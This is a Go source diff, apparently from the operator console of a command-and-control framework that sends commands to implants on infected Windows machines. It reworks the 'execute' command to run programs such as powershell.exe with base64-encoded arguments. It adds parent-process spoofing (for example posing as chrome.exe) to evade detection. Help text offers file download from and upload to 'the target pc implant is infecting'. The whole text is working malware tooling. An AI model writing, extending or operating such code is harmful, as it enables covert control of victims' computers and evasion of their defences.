@@ -33,6 +33,11 @@ func ParseImplantCommand(ImplantName, Command string) {
 	)
 
 	split_string = strings.Split(Command, " ")
+	for i := 0; i < len(split_string); i++ {
+		if split_string[i] == "" {
+			split_string = append(split_string[:i], split_string[i+1:]...)
+		}
+	}
 	cmd = split_string[0]
 	args = split_string[1:]
 
@@ -56,9 +61,13 @@ func ParseImplantCommand(ImplantName, Command string) {
 			case "execute", "exec":
 				menuobj.Text = append(menuobj.Text, strings.Split(PrevCmdWSub+"Execute Command Help:\n"+
 					"Execute a command on the implant.\n"+
-					"usage: execute -p <program> -a <arguments> -o <piped>\n"+
-					"example: execute -p cmd -a whoami /all -o true/false\n"+
-					"example: exec -p powershell -a whoami /all -o true \n", "\n")...)
+					"A full path to the executable you want to execute must be provided.\n"+
+					"A single space between each argument is required. If the command has multiple subcommand arguments such as: \n"+
+					"powershell.exe -c \"base64 encoded command\" the -c and and the base64 encoded command are placed after the -a switch with a single space between them.\n"+
+					"piped is a boolean value that determines if the command output is piped or not. If the command is piped, the output will be returned to the implant.\n"+
+					"usage: execute -e <program> -a <arguments> (opt) -p <piped> (opt) -s <spoof parent process name> (opt)\n"+
+					"example: execute -e C:\\Windows\\System32\\cmd.exe -a whoami /all -p true/false -s chrome.exe\n"+
+					"example: exec -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a whoami /all -p True -s chrome.exe \n", "\n")...)
 				break
 
 			case "download":
@@ -168,36 +177,62 @@ func ParseImplantCommand(ImplantName, Command string) {
 
 	case "execute", "exec":
 		var (
-			program   string
-			arguments []string
-			//Piped     *bool
+			//set argument defaults in-case our user doesn't use any switches.
+			exec        string
+			found       bool
+			arguments   = []string{"null"}
+			piped       = false
+			parentspoof = "null"
 		)
 		//execute a command on the implant.
+		for i := 0; i < len(args); i++ {
+			if args[i] == "-e" {
+				found = true
+				break
+			}
+		}
+		if !found {
+			menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+"[error] invalid execute command.\n", "\n")...)
+			return
+		}
 
 		//Piped = flags.BoolP("piped", "o", false, "If the command is piped or not.")
 
 		for i := 0; i < len(args); i++ {
 			if args[i] == "-a" {
+				arguments = []string{}
 				for j := i + 1; j < len(args); j++ {
-					if args[j] == "-o" {
-						break
-					}
 					if args[j] == "-p" {
+						arguments = append(arguments, "null")
 						break
 					}
-					arguments = append(arguments, args[j])
+					if args[j] == "-e" {
+						arguments = append(arguments, "null")
+						break
+					}
+					if args[j] == "-s" {
+						arguments = append(arguments, "null")
+						break
+					}
+					arguments = append(arguments, strings.TrimSpace(args[j]))
 				}
-			}
-
-			if args[i] == "-p" {
-				program = args[i+1]
+			} else if args[i] == "-e" {
+				exec = args[i+1]
+			} else if args[i] == "-p" {
+				if args[i+1] == "true" || args[i+1] == "True" || args[i+1] == "t" || args[i+1] == "T" {
+					piped = true
+				} else {
+					piped = false
+				}
+			} else if args[i] == "-s" {
+				parentspoof = args[i+1]
 			}
 		}
 
-		args = append([]string{}, program)
+		args = append([]string{}, "exec:"+exec, "spoof:"+parentspoof, "piped:"+strconv.FormatBool(piped))
 		args = append(args, arguments...)
 
-		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+program+" "+strings.Join(arguments, " "), "\n")...)
+		menuobj.Text = append(menuobj.Text, strings.Split(PrevCmd+exec+" "+strings.Join(arguments, " "), "\n")...)
 		SendImplantCommand(cmd, args, ImplantName)
 		break
 
@@ -374,7 +409,7 @@ func InteractWithImplant(FyneApp fyne.App) {
 	ImplantInteractionMenu.ImplantName = ImplantName
 
 	HelpMenuString = fmt.Sprintf("%s Help Menu:\nPlease use all listed commands without the '[,]' characters\n", ImplantName)
-	HelpMenuString += "[help] - Display this help menu.\n[help] [command] - Display help for a specific command.\n"
+	HelpMenuString += "[help] - Display this help menu.\n[help] [command] - Display help for a specific command. Arguments postfixed with (opt) are optional arguments\n"
 	HelpMenuString += "[execute / exec] - Execute a command on the implant.\n"
 	HelpMenuString += "[download] - Download a file from the target  pc implant is infecting.\n"
 	HelpMenuString += "[upload] - Upload a file to the target pc implant is infecting.\n"
